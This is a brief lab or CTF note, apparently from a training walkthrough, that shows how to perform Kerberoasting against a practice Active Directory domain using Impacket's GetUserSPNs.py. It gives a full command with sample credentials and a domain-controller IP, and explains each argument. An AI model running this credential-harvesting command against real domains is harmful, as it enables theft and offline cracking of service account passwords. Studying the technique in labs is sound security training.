## Kerberoasting

navigate to where GetUserSPNs.py is located (in my case impacket is installed in `/opt/impacket` so `GetUserSPNs.py` is in `/opt/impacket/exmaples`)

`sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.191.100 -request`

controller.local = domain

Machine:Password1 = user:password

dc-ip = domain-controller ip
